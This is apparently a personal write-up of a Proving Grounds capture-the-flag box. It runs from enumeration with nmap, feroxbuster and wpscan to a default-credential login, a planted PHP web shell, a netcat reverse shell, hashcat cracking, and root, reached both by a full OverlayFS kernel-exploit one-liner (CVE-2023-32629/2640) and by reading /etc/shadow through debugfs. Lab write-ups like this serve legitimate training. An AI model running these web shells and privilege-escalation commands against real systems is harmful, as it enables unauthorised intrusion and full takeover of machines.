# NMAP

```
sudo nmap -sC -sV 192.168.236.16 -oN nmap-extplorer
```

![[PG/Linux/attachments/Pasted image 20250711003227.png]]
- two porty jorts

All ports

```
sudo nmap -p- -sC -sV 192.168.236.16 -oN nmap-extplorer-all-ports
```

Oh snap we got a wordpress

# Web
![[PG/Linux/attachments/Pasted image 20250711003419.png]]

## Ferox 

Ferox is BLOWING UP. Tons of output. 

![[PG/Linux/attachments/Pasted image 20250711004326.png]]
- a lot of pages are blank when I visit though
- or load forever

![[PG/Linux/attachments/Pasted image 20250711004421.png]]



Um 

![[PG/Linux/attachments/Pasted image 20250711003650.png]]

Configged
![[PG/Linux/attachments/Pasted image 20250711003902.png]]

Aw

![[PG/Linux/attachments/Pasted image 20250711004043.png]]

![[PG/Linux/attachments/Pasted image 20250711005052.png]]
- Akismet plugin
# WPScan

```
wpscan --url http://192.168.236.16 --enumerate p --plugins-detection aggressive -o wpscan 
```

Okay so this tool is very silent lol 

You have to cat the results to see.

## Scan Results 

![[PG/Linux/attachments/Pasted image 20250711005315.png]]

Akismet plugin Version: 5.1
![[PG/Linux/attachments/Pasted image 20250711005348.png]]

Here's a XSS vuln from exploitdb
https://www.exploit-db.com/exploits/37902

Worth a try.

![[PG/Linux/attachments/Pasted image 20250711093124.png]]
- Looks like I just need to give an IP

It fails 
![[PG/Linux/attachments/Pasted image 20250711093244.png]]

Script is kind of buggy and it's super old and doesn't specify which akismet version it's compatible with.

![[PG/Linux/attachments/Pasted image 20250711093426.png]]
- this exploit is from 2012 so definitely old
![[PG/Linux/attachments/Pasted image 20250711093522.png]]
- 5.1 is from 2023

Snyk says it may not be vulnerable.

![[PG/Linux/attachments/Pasted image 20250711093734.png]]

I may bench this for now. Try to enumerate users from the WP site.

```
wpscan --url http://192.168.236.16 --enumerate u aggressive -o wpscan-users
```


Okay so I was in a rabbit hole. Should've reviewed the ferox output closer because I missed a login page. I was put off by the huge amount of output. 

I'm actually going to re-run ferox with a `--depth 2 `flag and `--filter-status 404`

```
feroxbuster -u "http://192.168.236.16" -w /usr/share/seclists/Discovery/Web-Content/common.txt --depth 2 --filter-status 404
```

![[PG/Linux/attachments/Pasted image 20250711100612.png]]
- this /filemanager brings me to a login

![[PG/Linux/attachments/Pasted image 20250711100637.png]]
- try `admin:admin` and get logged in 

Logged in as admin 

![[PG/Linux/attachments/Pasted image 20250711100726.png]]
- valid security warning

Immediately see a user: dora

![[PG/Linux/attachments/Pasted image 20250711100806.png]]

Can I change her password?

![[PG/Linux/attachments/Pasted image 20250711100848.png]]

Gave her a new password (dora) and made her an admin

![[PG/Linux/attachments/Pasted image 20250711100952.png]]
- seems like it did save 

# SSH with little hope

```
ssh dora@192.168.236.16
```

![[PG/Linux/attachments/Pasted image 20250711101119.png]]
- nope


# Poking around 

Seems like I may be able to save a php reverse shell or something

![[PG/Linux/attachments/Pasted image 20250711101237.png]]

Let's see what ftp mode looks like 

![[PG/Linux/attachments/Pasted image 20250711101422.png]]

Another login

![[PG/Linux/attachments/Pasted image 20250711101446.png]]
- admin:admin again

![[PG/Linux/attachments/Pasted image 20250711101513.png]]
- ftp server isn't running

I'm going to try to save a web shell.

```
<?php system($_GET['cmd']); ?>
```

![[PG/Linux/attachments/Pasted image 20250711101817.png]]

Now where do I access it...

Like so
![[PG/Linux/attachments/Pasted image 20250711101954.png]]
- okie cool that worked! 
- Rev shell time!!

# Reverse Shell

Using Ivan's

![[PG/Linux/attachments/Pasted image 20250711102146.png]]

Set up listener 

```
nc -lvnp 9001
```

![[PG/Linux/attachments/Pasted image 20250711102245.png]]

Go to new file 

![[PG/Linux/attachments/Pasted image 20250711102355.png]]

Give the file a name and save

![[PG/Linux/attachments/Pasted image 20250711102429.png]]

Select the file 

![[PG/Linux/attachments/Pasted image 20250711102503.png]]

Paste in rev shell code and save 

![[PG/Linux/attachments/Pasted image 20250711102555.png]]

Navigate to file in the browser

![[PG/Linux/attachments/Pasted image 20250711102642.png]]

Check listener - we're in

![[PG/Linux/attachments/Pasted image 20250711104541.png]]

Spawn TTY

![[PG/Linux/attachments/Pasted image 20250711104731.png]]

I'm www-data. Can I switch to dora since I set her password?

![[PG/Linux/attachments/Pasted image 20250711104820.png]]
- no

```
grep -ir password
```
- returns a lot...

Going to try SUID 

```
find / -perm -4000 2>/dev/null
```

![[PG/Linux/attachments/Pasted image 20250711105308.png]]
- default

Capabilities 

```
/usr/sbin/getcap -r / 2>/dev/null
```

![[PG/Linux/attachments/Pasted image 20250711105404.png]]
- meh

# Poking around filesystem

I wonder if this is the password I set for dora?

![[PG/Linux/attachments/Pasted image 20250711105924.png]]

Identify the hash type 

![[PG/Linux/attachments/Pasted image 20250711110106.png]]

bcrypt hash... idt this is the passwd I set 

![[PG/Linux/attachments/Pasted image 20250711110401.png]]

Trying hashcat, but idk if hashcat will work. With time, I might do a custom wordlist related to dora the explorer or something. Okay, the password was dora lol.

# Linpeas

![[PG/Linux/attachments/Pasted image 20250711111030.png]]

Oh no... I wonder if I should not have changed dora's password... this was a problem last time. That is the problem lol. Fuck. 

Reverting the box.

Here is where the password is stored

```
cat /var/www/html/filemanager/config/.htusers.php
```

Grab dora's hash again...

# Hashcat

Hash mode for bycrypt is 3200

```
hashcat -m 3200 dora.hash /usr/share/wordlists/rockyou.txt
```

![[PG/Linux/attachments/Pasted image 20250711114141.png]]

Why did dora take longer to crack? 

```
dora:doraemon
```


Switch to dora user 

```
su dora
```
![[PG/Linux/attachments/Pasted image 20250711114306.png]]

Grab local flag.

![[PG/Linux/attachments/Pasted image 20250711114410.png]]

Spawn TTY

# Enum for Priv Esc 

```
sudo -l
```

![[PG/Linux/attachments/Pasted image 20250711114536.png]]
- nope

SUID 

```
find / -perm -4000 2>/dev/null
```


![[PG/Linux/attachments/Pasted image 20250711114635.png]]
- nothing interesting

Capabilities

![[PG/Linux/attachments/Pasted image 20250711114734.png]]
- not interested

Crontab

```
crontab -l
```

![[PG/Linux/attachments/Pasted image 20250711114850.png]]

Netstat 

```
netstat -ano
```

![[PG/Linux/attachments/Pasted image 20250711115011.png]]
- zilch

# Kernel exploit?


```
cat /etc/issue
```

```
uname -r
```

```
arch
```



![[PG/Linux/attachments/Pasted image 20250711115327.png]]

Googled "Ubuntu 20.04.6 LTS \n \l 5.4.0-146-generic exploit for priv esc"
![[PG/Linux/attachments/Pasted image 20250711115231.png]]
- OverlayFS misconfig allows for privesc


Googling a PoC and found this one..their ubuntu version is different from mine though..does it matter?
![[PG/Linux/attachments/Pasted image 20250711115649.png]]

Q....if there's a mismatch between the kernel version and the ubuntu version would the kernel exploit work?
![[PG/Linux/attachments/Pasted image 20250711115535.png]]

Google AI God said no.

There's a one-liner for this [exploit here](https://github.com/ThrynSec/CVE-2023-32629-CVE-2023-2640---POC-Escalation/blob/main/poc.sh) -> created by @liadeliyahu on X

```
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*; python3 -c 'import os;os.setuid(0);os.system(\"/bin/bash\")'"
```

Yas it worked!

![[PG/Linux/attachments/Pasted image 20250711115924.png]]

⭐got root⭐

Grab root flag

![[PG/Linux/attachments/Pasted image 20250711120032.png]]
- wtf

Excirse me 

![[PG/Linux/attachments/Pasted image 20250711120155.png]]

Was this not the intended exploit.. lol

Okay apparently this is the intended path...

# Privesc 

Again when I need to slow down..

![[PG/Linux/attachments/Pasted image 20250711120933.png]]
- notice dora part of disk group

According to HackTricks, we can use `debugfs` to enumerate disk with root level privileges where we can read and write to any files

Display disk space and usage 

```
df -h
```


![[PG/Linux/attachments/Pasted image 20250711121148.png]]

We want the `/` to have root access which is mounted on `/dev/mapper/ubuntu--vg-ubuntu--lv`

# Debugfs

```
debugfs /dev/mapper/ubuntu--vg-ubuntu--lv
```

Which basically gives us a debugfs prompt 

Test creating a directory 
```
mkdir test
```

Try to read `/etc/passwd

```
cat /etc/passwd
```

![[PG/Linux/attachments/Pasted image 20250711122046.png]]

Try to read `/etc/shadow`

```
cat /etc/shadow
```

![[PG/Linux/attachments/Pasted image 20250711122141.png]]

Grab root hash

```
$6$AIWcIr8PEVxEWgv1$3mFpTQAc9Kzp4BGUQ2sPYYFE/dygqhDiv2Yw.XcU.Q8n1YO05.a/4.D/x4ojQAkPnv/v7Qrw7Ici7.h
```

Simple

![[PG/Linux/attachments/Pasted image 20250711122324.png]]

```
hashcat -m 1800 root.hash /usr/share/wordlist/rockyou.txt
```



![[PG/Linux/attachments/Pasted image 20250711122531.png]]
^ remove the `:1945..`

```
hashcat -m 1800 --user root.hash /usr/share/wordlists/rockyou.txt
```


Then it cracks to explorer (prob could've guessed that tbh)
![[PG/Linux/attachments/Pasted image 20250711122722.png]]


Quit debugfs shell 

```
quit
```


```
su root
```

![[PG/Linux/attachments/Pasted image 20250711122929.png]]

Grab proof.txt now.

![[PG/Linux/attachments/Pasted image 20250711123026.png]]

Idk what these flags are about 

![[PG/Linux/attachments/Pasted image 20250711123128.png]]

```
ZmU2VjLmNvbQ==
```